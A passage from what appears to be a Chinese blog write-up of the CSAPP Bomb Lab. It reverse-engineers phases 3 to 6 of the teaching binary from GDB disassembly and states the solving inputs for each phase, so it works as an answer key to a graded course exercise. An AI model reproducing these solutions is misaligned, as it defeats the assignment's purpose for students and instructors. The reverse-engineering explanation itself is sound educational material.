处，且每个数字都必须为它前一个数字的两倍。</p><p>那么代码逻辑便理清楚了：输入的第一个数字为 1，其后每一个数字都为前一个数字的两倍，密码为：<code>1 2 4 8 16 32</code>.</p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp0x0000000000400fcd &lt;+138&gt;:   ret</code></pre><p>这一关的代码量比较大，但是中间一段看起来很有规律，尤其注意这一句：<code>jmp  *0x402470(, %rax, 8)</code>，直接根据 <code>%rax</code> 寄存器的值计算偏移量进行跳转，这便是 <strong>switch 语句</strong> 所采用的跳转方式，地址 <code>0x402470</code> 即跳转表的首地址。</p><p>另外，还需要关注的一条指令是 <code>call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</code>，貌似是一个函数调用指令，以下是我借助大语言模型得到的解释：</p><blockquote><p><code>__isoc99_sscanf@plt</code> 是一个指向 <code>sscanf</code> 函数的 PLT（Procedure Linkage Table）入口点的符号引用。<code>sscanf</code> 函数是 C 语言标准库中的一个函数，用于从输入流中按照指定格式读取数据。<code>@plt</code> 表示这是一个通过动态链接的程序跳转表（Procedure Linkage Table）来调用的函数。</p><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>在 x86-64 架构中，函数参数通常是通过寄存器传递的。对于 <code>sscanf</code> 函数，它的参数如下：</p><ul><li><code>%rdi</code>：第一个参数，通常是文件描述符或指针类型。对于 <code>sscanf</code>，这是指向输入字符串的指针。</li><li><code>%rsi</code>：第二个参数，指向格式化字符串的指针。</li><li><code>%rdx</code>：第三个参数，如果有的话，指向第一个要填充的变量的地址。</li><li>更多的参数会继续使用后续的寄存器 <code>%rcx</code>, <code>%r8</code>, 和 <code>%r9</code>。如果参数超过六个，那么它们将会通过栈传递。</li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>在 x86-64 架构中，返回值会被放在 <code>%rax</code> 寄存器中。<code>sscanf</code> 返回成功匹配和赋值的项数，如果没有任何匹配，则返回零。如果输入结束前格式化字符串就被耗尽了，也返回零。如果遇到任何读取错误（如读取一个整数但输入不是有效的整数），则返回负数。</p></blockquote><p>简而言之，<code>sscanf</code> 类似于 <code>scanf</code>，只是输入从标准输入变成了指定的字符串。在这里，<code>sscanf</code> 指定了 4 个参数，作用为：从 <code>%rdi</code> 寄存器指向的字符串中进行读取，<code>%rsi</code> 指向格式化字符串，<code>%rdx</code> 和 <code>%rcx</code> 分别指向被格式化读取到的变量 1 和变量 2. 若读取成功，则返回成功读取的项数，即为 2，存入 <code>%rax</code> 寄存器中。</p><p>查看 <code>0x4025cf</code> 处的字符串，即格式化字符串，为 <code>%d %d</code>，说明读取的两个值都为十进制整数，即本关密码的形式。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3.png"></p><p>最后查看一下整张跳转表的值，根据最终跳转到的位置确定输入的值。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3-2.png"></p><p>然后将其改写为 switch 语句，下面直接给出完整代码的翻译结果：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax &lt;&#x3D; 1) &#123;          &#x2F;&#x2F; 读取成功的值个数小于2    explode_bomb();&#125;if (Mem[%rsp + 8] &gt; 7u) &#123; &#x2F;&#x2F; 读取到的（输入的）第一个值大于7或小于0    explode_bomb();&#125;%eax &#x3D; Mem[%rsp + 8];switch (%rax) &#123;    case 0:        %eax &#x3D; 0xcf;  break;    case 1:        %eax &#x3D; 0x137; break;    case 2:        %eax &#x3D; 0x2c3; break;    case 3:        %eax &#x3D; 0x100; break;    case 4:        %eax &#x3D; 0x185; break;    case 5:        %eax &#x3D; 0xce;  break;    case 6:        %eax &#x3D; 0x2aa; break;    case 7:    %eax &#x3D; 0x147; break;&#125;&#x2F;&#x2F; 输入的第二个值等于%eax寄存器的值if (%eax !&#x3D; Mem[%rsp + 12]) &#123;    explode_bomb();&#125;</code></pre><p>要使得 <code>%eax</code> 的值等于输入的第二个值，只需要保证输入的第一个值经过 switch 语句选择之后，赋值正好等于输入的第二个值。</p><p>因此本关的答案并不是固定的，<code>0 207</code>、 <code>3 256</code> 等等都是正确答案。注意不能写成 <code>0 0xcf</code>、<code>3 0x100</code>，因为输入格式为十进制整数，需要将十六进制进行转换。</p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;:    test   %eax,%eax0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp0x0000000000401061 &lt;+85&gt;:    ret</code></pre><p>这一关主要分成两个函数：phase_4 和 func_4，首先查看 phase_4，代码前一段和 phase_3 非常类似：读取两个整数，且保证输入的第一个值位于区间 <code>[0, 15)</code> 内。</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax !&#x3D; 2) &#123;    explode_bomb();&#125;if (Mem[%rsp + 8] &gt;&#x3D; 15u) &#123;explode_bomb();&#125;%edx &#x3D; 0xe;%esi &#x3D; 0;%edi &#x3D; Mem[%rsp + 8];func4(%rdi, %rsi, %rdx); &#x2F;&#x2F; func4(Mem[%rsp+8], 0, 14)if (%eax !&#x3D; 0) &#123;    explode_bomb();&#125;if (Mem[%rsp + 12] !&#x3D; 0) &#123;    explode_bomb();&#125;</code></pre><p>后一段便是传递 3 个参数给函数 func_4 进行调用，需要保证返回值和输入的第二个数为 0，因此密码的第二个数为 0。可以看到，phase_4 的代码结构还是很简单易懂的，关键是对 func_4 函数的分析。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax0x0000000000400fdd &lt;+15&gt;:    sar    %eax0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp0x000000000040100b &lt;+61&gt;:    ret</code></pre><p>仔细观察 func_4 的代码，发现含有对 func_4 的调用，因此 func_4 是一个 <strong>递归</strong> 函数。在对递归函数进行翻译时，本质上与普通的函数并没有区别，结果如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> c <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span>res <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>    res <span class="token operator">+=</span> temp<span class="token punctuation">;</span>    res <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>    temp <span class="token operator">=</span> b <span class="token operator">+</span> res<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">></span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        c <span class="token operator">=</span> temp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            b <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> res <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以看到，程序的逻辑还是比较复杂的，但是注意到参数 b 和 c 的值都是确定的，真正的变量只有参数 a。因此这里有一个偷懒的办法：将程序翻译为一个语法严格正确的高级语言程序（而不是之前的伪代码），然后枚举所有可能的 a（只有 15 中情况），运行测试即可，结果为 0 的即为满足要求的值，也就是密码的第一个数。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p4.png"></p><p>可见，本关的正解同样不止一个，<code>1 0</code>、<code>3 0</code>、<code>7 0</code> 都是正确答案。</p><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401062 &lt;+0&gt;:     push   %rbx0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp0x00000000004010f2 &lt;+144&gt;:   pop    %rbx0x00000000004010f3 &lt;+145&gt;:   ret</code></pre><p>这一关的汇编代码逻辑不算复杂，我们主要关注翻译后的代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rbx &#x3D; %rdi;Mem[%rsp + 0x18] &#x3D; Mem[%fs + 0x28]; &#x2F;&#x2F; 4Byte%eax ^&#x3D; %eax;  &#x2F;&#x2F; %eax &#x3D; 0if (string_length() !&#x3D; 6) &#123;explode_bomb();&#125;for (%eax &#x3D; 0; %eax !&#x3D; 6; ++%eax) &#123;    %edx &#x3D; Mem[%rbx + %rax] &amp; 0xf;    Mem[%rsp + %rax + 0x10] &#x3D; Mem[0x4024b0 + %rdx]; &#x2F;&#x2F; 1Byte&#125;Mem[%rsp + 0x16] &#x3D; 0;%esi &#x3D; 0x40245e;%rdi &#x3D; %rsp + 0x10;if (string_not_equal(%rdi, %esi) !&#x3D; 0) &#123;explode_bomb();&#125;%rax &#x3D; Mem[%rsp + 0x18] ^ Mem[%fs + 0x28];if (%rax !&#x3D; 0) &#123;__stack_chk_fail();&#125;</code></pre><p>从 <code>if (string_length() != 6) explode_bomb();</code> 可以看出密码是一个长度为 6 的字符串，随后的 <code>for</code> 循环遍历字符串的各个字符，提取低一字节的值 <code>%edx</code>，将其作为相对于地址 <code>0x4024b0</code> 的偏移量，读取目标地址 <code>0x4020b0 + %rdx</code> 处的低 4 位数据，存入地址 <code>%rsp + %rax + 0x10</code> 处，构造出一个起始地址为 <code>%rsp + 0x10</code> 的长度为 6 的字符串。然后将起始地址为 <code>%rsp + 0x10</code> 的字符串与起始地址为 <code>0x40245e</code> 的字符串作比较，如果不相同，则“引爆炸弹”。最后进行缓冲区溢出检测，如果溢出，则调用 <code>__stack_chk_fail()</code>.</p><p>经过以上的描述，不难看出输入的 6 位字符串其实是一个相对于数组 <code>0x4024b0</code> 的索引，只不过索引值不直接给出，而是等于字符的低 4 位值。本关的目标便是使得输入的 6 位索引经过映射之后得到的字符串正好等于地址 <code>0x40245e</code> 的字符串，即 &quot;flyers&quot;.</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p5.png"></p><p>以字符 <em>f</em> 为例，<em>f</em> 在 array 表中的（最小）索引为 9，而所有低 4 位等于 9（1001）的字符都满足条件，例如 <em>i</em> .</p><table><thead><tr><th align="center">字符c1</th><th align="center">索引</th><th align="center">字符c2</th></tr></thead><tbody><tr><td align="center">f</td><td align="center">9</td><td align="center">i</td></tr><tr><td align="center">l</td><td align="center">15</td><td align="center">o</td></tr><tr><td align="center">y</td><td align="center">14</td><td align="center">n</td></tr><tr><td align="center">e</td><td align="center">5</td><td align="center">e</td></tr><tr><td align="center">r</td><td align="center">6</td><td align="center">f</td></tr><tr><td align="center">s</td><td align="center">7</td><td align="center">g</td></tr></tbody></table><p>依次类推，一个满足条件的密码为：<em>ionefg</em> .</p><h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>最复杂的一关，代码量非常大，而且逻辑比较复杂，整体观察比较困难，可以先将代码按照循环块拆分为几个部分，依次进行分析。</p><p>在使用 GDB 调试的时候，可以为每个块的起始部分分别打上断点，同时为了调试的方便，可将这些命令写入 <code>.gdbinit</code> 中。</p><pre class="language-shell" data-language="shell"><code class="language-shell">b phase_6b *0x401153b *0x40116fb *0x4011abb *0x4011d2r .&#x2F;ans.txt</code></pre><h2 id="block-1"><a href="#block-1" class="headerlink" title="block_1"></a>block_1</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r140x00000000004010f6 &lt;+2&gt;:     push   %r130x00000000004010f8 &lt;+4&gt;:     push   %r120x00000000004010fa &lt;+6&gt;:     push   %rbp0x00000000004010fb &lt;+7&gt;:     push   %rbx0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r130x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r140x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;:    add    $0x4,%r130x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</code></pre><p>第一部分整体而言不算太复杂，直接查看翻译后的代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 读取6个4Byte数字放入从%r14寄存器指向地址开始的内存空间中%r13 &#x3D; %rsp;%rsi &#x3D; %rsp;read_six_numbers();%r14 &#x3D; %rsp;for (%r12d &#x3D; 0; %r12 !&#x3D; 6; ) &#123;%rbp &#x3D; %r13;    %eax &#x3D; Mem[%r13];    %eax -&#x3D; 1;    if (%eax &gt; 5u) &#123;        explode_bomb();    &#125;    %r12d +&#x3D; 1;    if (%r12d &#x3D;&#x3D; 6) break;    for (%ebx &#x3D; %r12d; %ebx &lt;&#x3D; 5; ++%ebx) &#123;        %rax &#x3D; %ebx;  &#x2F;&#x2F; 符号扩展        %eax &#x3D; Mem[4 * %rax + %rsp];        if (Mem[%rbp] &#x3D;&#x3D; %eax) &#123;            explode_bomb();        &#125;&#125;%r13 +&#x3D; 4;&#125;</code></pre><p>与 phase_2 类似，首先读取 6 个数字，确定密码由 6 个数字组成。</p><p>随后主要关注循环中导致触发 <code>explode_bomb</code> 的条件，这些条件指明了密码的限定范围。第一个是 <code>%eax &gt; 5u</code>，注意前一条指令是 <code>%eax</code> 自减一，因此可以确定 6 个数字的范围都是 <code>[1, 6]</code>.</p><blockquote><p>这里自减一很有意思，刚开始看可能以为是多此一举，直接判断 %eax 是否大于 6u 不就完了吗？但是考虑到 0 这个特例，它在自减一后得到 -1，而 -1 满足无符号比较大于 5u，因此被排除在外。如果直接判断 %eax 是否大于 6u，那么数字的限定范围就变成了 [0, 6].</p></blockquote><p>后面的内层循环不难看出是用来判重的，因此六个数字的范围得以确定：每个数字都位于区间 <code>[1, 6]</code> 内且无重复数字。</p><h2 id="block-2"><a href="#block-2" class="headerlink" title="block_2"></a>block_2</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; %r14 &#x3D; %rsp&#x2F;&#x2F; 遍历6个数字，每个数字num的值变为7-num%ecx &#x3D; 7;for (%rax &#x3D; %r14, %rsi &#x3D; %rsp + 0x18; %rax !&#x3D; %rsi; %rax +&#x3D; 4) &#123;%edx &#x3D; %ecx - Mem[%rax];Mem[%rax] &#x3D; %edx;&#125;</code></pre><p>第二部分非常简单，遍历输入的 6 个数字，将每个数字 num 更改为 7 - num.</p><h2 id="block-3"><a href="#block-3" class="headerlink" title="block_3"></a>block_3</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</code></pre><p>第三部分虽然代码量不大，但是跳转语句很多，逻辑非常复杂。这里我采用了分部的方式，首先改写为带 goto 语句的高级语言伪代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;goto phase_6_163;phase_6_130:%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;if (%eax !&#x3D; %ecx) goto phase_6_130;goto phase_6_148;phase_6_143:%edx &#x3D; 0x6032d0;phase_6_148:Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;if (%rsi &#x3D;&#x3D; 0x18) goto phase_6_183;phase_6_163:%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &lt;&#x3D; 1) goto phase_6_143;%eax &#x3D; 1;%edx &#x3D; 0x6032d0;goto phase_6_130;</code></pre><p>然后对照一些常见的形式 goto 改写为循环语句，这里的翻译过程比较繁琐，需要静下来仔细思考。</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;while (%rsi !&#x3D; 0x18) &#123;%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &gt; 1) &#123;%eax &#x3D; 1;%rdx &#x3D; 0x6032d0;while (%eax !&#x3D; %ecx) &#123;%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;&#125;&#125;else &#123;%edx &#x3D; 0x6032d0;&#125;Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;&#125;</code></pre><p>观察翻译后的代码，似乎和 phase_5 类似，遍历每个数字，并将每个数字当作索引 i，在起始地址为 <code>0x6032d0</code> 的表中查找第 i 个元素，以 <code>%rsp + 0x20</code> 作为起始地址创建一个线性结构。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p6.png"></p><p>打印起始地址为 <code>0x6032d0</code> 